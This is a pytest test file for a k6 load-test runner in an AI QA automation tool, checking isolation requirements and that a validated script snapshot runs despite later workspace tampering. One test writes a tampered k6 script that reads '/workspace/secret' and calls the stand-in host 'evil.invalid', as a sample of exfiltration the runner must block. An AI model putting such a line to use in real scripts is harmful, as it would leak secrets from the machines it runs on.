import json
from pathlib import Path

import pytest

from ai_qa_automation.policy import PolicyEngine
from ai_qa_automation.tools import performance
from ai_qa_automation.tools.execution_env import BoundedSubprocessResult
from ai_qa_automation.tools.performance import K6Runner


def _policy(tmp_path: Path) -> PolicyEngine:
    return PolicyEngine(tmp_path, tmp_path)


def _write_import_graph(tmp_path: Path) -> Path:
    directory = tmp_path / "performance"
    directory.mkdir()
    (directory / "helper.js").write_text(
        "export const path = '/v1';\n",
        encoding="utf-8",
    )
    (directory / "load.js").write_text(
        "import http from 'k6/http';\n"
        "import { path } from './helper.js';\n"
        "export default function () { http.get(__ENV.BASE_URL + path); }\n",
        encoding="utf-8",
    )
    return Path("performance/load.js")


def _summary() -> dict[str, object]:
    return {
        "metrics": {
            "http_req_duration": {
                "values": {"med": 1.0, "p(90)": 2.0, "p(95)": 3.0, "p(99)": 4.0}
            },
            "http_reqs": {"values": {"rate": 5.0}},
            "http_req_failed": {"values": {"rate": 0.0}},
        }
    }


def test_k6_requires_process_filesystem_isolation_before_execution(tmp_path: Path) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
    )

    with pytest.raises(PermissionError, match="process/filesystem isolation"):
        runner.run(
            script,
            target_url="http://127.0.0.1:8000",
            environment="local",
        )


@pytest.mark.parametrize("value", [1, "true", object()])
def test_k6_rejects_non_boolean_process_isolation_assertion(
    tmp_path: Path, value: object
) -> None:
    with pytest.raises(ValueError, match="external_process_isolation_enforced"):
        K6Runner(
            tmp_path,
            _policy(tmp_path),
            external_egress_enforced=True,
            external_process_isolation_enforced=value,  # type: ignore[arg-type]
        )


def test_k6_executes_validated_snapshot_after_workspace_mutation(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    script = _write_import_graph(tmp_path)
    runner = K6Runner(
        tmp_path,
        _policy(tmp_path),
        external_egress_enforced=True,
        external_process_isolation_enforced=True,
    )
    monkeypatch.setattr(performance.shutil, "which", lambda _: "/usr/bin/k6")

    original_write = runner._write_validated_snapshot

    def mutate_then_write(snapshot_root: Path, modules: dict[Path, str]) -> None:
        (tmp_path / "performance/load.js").write_text(
            "import http from 'k6/http'; open('/workspace/secret'); "
            "http.get('https://evil.invalid');\n",
            encoding="utf-8",
        )
        (tmp_path / "performance/helper.js").write_text(
            "export const path = '/evil';\n",
            encoding="utf-8",
        )
        original_write(snapshot_root, modules)

    monkeypatch.setattr(runner, "_write_validated_snapshot", mutate_then_write)
    observed: dict[str, object] = {}

    def fake_run(
        command: list[str],
        *,
        cwd: Path,
        env: dict[str, str],
        timeout_seconds: int,
    ) -> BoundedSubprocessResult:
        del env, timeout_seconds
        observed["cwd"] = cwd
        snapshot_script = Path(command[-1])
        assert snapshot_script.read_text(encoding="utf-8").endswith(
            "export default function () { http.get(__ENV.BASE_URL + path); }\n"
        )
        assert (snapshot_script.parent / "helper.js").read_text(encoding="utf-8") == (
            "export const path = '/v1';\n"
        )
        summary_path = Path(command[command.index("--summary-export") + 1])
        summary_path.write_text(json.dumps(_summary()), encoding="utf-8")
        return BoundedSubprocessResult(
            returncode=0,
            stdout="",
            stderr="",
            stdout_truncated=False,
            stderr_truncated=False,
            timed_out=False,
        )

    monkeypatch.setattr(performance, "run_bounded_subprocess", fake_run)

    metrics = runner.run(
        script,
        target_url="http://127.0.0.1:8000",
        environment="local",
    )

    assert metrics.p95_ms == 3.0
    assert observed["cwd"] != tmp_path
    assert str(observed["cwd"]).endswith("/workspace")
